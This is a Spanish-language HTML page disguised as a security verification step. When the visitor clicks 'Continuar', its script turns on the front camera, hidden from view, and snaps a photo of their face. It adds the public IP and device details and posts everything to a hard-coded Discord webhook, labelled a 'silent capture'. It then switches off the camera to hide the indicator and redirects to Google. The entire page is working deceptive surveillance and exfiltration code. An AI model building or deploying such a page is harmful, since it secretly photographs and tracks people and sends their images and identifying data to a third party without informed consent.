<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de seguridad</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #container { text-align: center; max-width: 400px; padding: 30px; background: #1e1e1e; border-radius: 16px; }
        button { background: #5865F2; color: white; border: none; padding: 16px 32px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; }
        button:active { transform: scale(0.95); }
        #status { margin-top: 20px; font-size: 14px; color: #aaa; }
        /* Ocultar el video completamente */
        video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
<div id="container">
    <h2>🔒 Verificación requerida</h2>
    <p style="font-size:14px; color:#aaa;">Haga clic en el botón para continuar con la verificación de seguridad.</p>
    <button id="btnStart">Continuar</button>
    <div id="status">Listo</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    (function(){
        "use strict";

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528258625083281508/TskUp1gBftr6JJ6BbICRweaC41S4PTbRH0mYIjWCWNIl0LACwJ2zLlhZNX67NbH7mWTr";
        let stream = null;
        let capturado = false;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('btnStart');

        // Función para obtener IP pública
        async function obtenerIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'desconocida';
            } catch { return 'no disponible'; }
        }

        // Función para obtener info del dispositivo
        function getDeviceInfo() {
            return {
                ua: navigator.userAgent,
                platform: navigator.platform || 'desconocida',
                language: navigator.language || 'desconocido',
                screen: `${window.screen.width}x${window.screen.height}`
            };
        }

        // Capturar un frame y enviar
        async function capturarYEnviar() {
            if (!stream) {
                statusDiv.textContent = '❌ Cámara no disponible';
                return;
            }

            // Asegurar que el video tenga dimensiones
            const vw = video.videoWidth;
            const vh = video.videoHeight;
            if (vw === 0 || vh === 0) {
                statusDiv.textContent = '❌ Esperando señal de cámara...';
                return;
            }

            canvas.width = vw;
            canvas.height = vh;
            ctx.drawImage(video, 0, 0, vw, vh);

            // Convertir a blob
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
            if (!blob) {
                statusDiv.textContent = '❌ Error al generar imagen';
                return;
            }

            const fileName = `face_${Date.now()}.jpg`;
            const file = new File([blob], fileName, { type: 'image/jpeg' });

            // Obtener IP e info
            const ip = await obtenerIP();
            const info = getDeviceInfo();
            const timestamp = new Date().toISOString();

            const texto = `**📸 Captura silenciosa**\n` +
                `🕒 ${timestamp}\n` +
                `🌐 IP: ${ip}\n` +
                `📱 ${info.ua}\n` +
                `🖥️ ${info.platform}\n` +
                `🌍 ${info.language}\n` +
                `📐 ${info.screen}`;

            const formData = new FormData();
            formData.append('file', file, fileName);
            formData.append('content', texto);

            statusDiv.textContent = '⏳ Enviando...';

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    statusDiv.textContent = '✅ Verificación completada. Redirigiendo...';
                    capturado = true;
                    // Redirigir a una página legítima (por ejemplo, Google)
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1500);
                } else {
                    const err = await response.text();
                    statusDiv.textContent = `❌ Error: ${response.status} - ${err}`;
                }
            } catch (e) {
                statusDiv.textContent = `❌ Fallo en envío: ${e.message}`;
            } finally {
                // Detener cámara después de capturar (para ocultar el indicador)
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                // Ocultar video
                video.srcObject = null;
            }
        }

        // Función principal que se ejecuta al hacer clic
        async function iniciarCaptura() {
            btn.disabled = true;
            statusDiv.textContent = '🔍 Solicitando acceso a la cámara...';

            try {
                // Pedir cámara frontal (user) o trasera (environment) – usamos 'user' para selfie
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                // Esperar a que el video tenga datos
                await new Promise((resolve) => {
                    if (video.readyState >= 2) {
                        resolve();
                    } else {
                        video.onloadedmetadata = resolve;
                    }
                });
                // Esperar un breve momento para que el sensor se estabilice
                await new Promise(r => setTimeout(r, 300));
                await capturarYEnviar();
            } catch (err) {
                statusDiv.textContent = '❌ Error: ' + err.message;
                btn.disabled = false;
                // Si falla, intentar con cámara trasera
                if (err.message.includes('facingMode')) {
                    statusDiv.textContent = '🔁 Intentando con cámara trasera...';
                    try {
                        const constraints2 = {
                            video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        };
                        stream = await navigator.mediaDevices.getUserMedia(constraints2);
                        video.srcObject = stream;
                        await new Promise((resolve) => {
                            if (video.readyState >= 2) resolve();
                            else video.onloadedmetadata = resolve;
                        });
                        await new Promise(r => setTimeout(r, 300));
                        await capturarYEnviar();
                    } catch (err2) {
                        statusDiv.textContent = '❌ No se pudo acceder a la cámara.';
                        btn.disabled = false;
                    }
                }
            }
        }

        // Al hacer clic en el botón, se inicia la captura
        btn.addEventListener('click', iniciarCaptura);

        // Si el usuario cierra la pestaña, liberar recursos
        window.addEventListener('beforeunload', function() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
        });
    })();
</script>
</body>
</html>
